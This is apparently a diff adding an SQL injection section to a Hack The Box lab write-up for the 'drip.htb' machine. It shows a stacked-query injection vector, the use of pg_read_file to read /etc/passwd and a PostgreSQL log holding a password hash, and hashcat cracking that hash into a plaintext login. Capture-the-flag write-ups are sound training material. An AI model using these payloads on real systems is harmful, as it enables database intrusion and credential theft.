@@ -186,3 +186,70 @@ http://dev-a3f1-01.drip.htb/reset/ImJjYXNlQGRyaXAuaHRiIg.aMT8tg.jgx5a6ktRvXvrWoy
 ![](https://github.com/user-attachments/assets/2a17c94a-5c16-4cd1-97b0-3d2be55369fb)
 
 ![](https://github.com/user-attachments/assets/55d9d9f5-86fb-49b9-8272-beb6f2255af8)
+
+### 2.4. SQL Injection
+
+The search function at `/analytics` is vulnerable to SQL injection with a simple `''; <command>;` injection vector
+
+#### Reading `/etc/passwd`
+
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
+sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
+bcase:x:1000:1000:Bryce Case Jr.,,,:/home/bcase:/bin/bash
+postgres:x:102:110:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+postfix:x:103:111::/var/spool/postfix:/usr/sbin/nologin
+dovecot:x:104:113:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin
+dovenull:x:105:114:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin
+vmail:x:5000:5000::/home/vmail:/usr/bin/nologin
+avahi:x:106:115:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
+polkitd:x:996:996:polkit:/nonexistent:/usr/sbin/nologin
+ntpsec:x:107:116::/nonexistent:/usr/sbin/nologin
+sssd:x:108:117:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
+_chrony:x:109:118:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
+ebelford:x:1002:1002:Eugene Belford:/home/ebelford:/bin/bash
+```
+
+Reading a PostgreSQL log file with `''; SELECT pg_read_file('/var/log/postgresql/postgresql-15-main.log.1', 0, 10000000);` reveals password hash for `ebelford`
+
+```
+UPDATE Users SET password 8bbd7f88841b4223ae63c8848969be86 WHERE username = ebelford;
+```
+
+Cracking hash with hashcat
+
+```console
+root@kali:~# hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+⋮
+
+8bbd7f88841b4223ae63c8848969be86:ThePlague61780
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Hash.Target......: 8bbd7f88841b4223ae63c8848969be86
+⋮
+```
+
+Credential discovered: `ebelford`/`ThePlague61780`
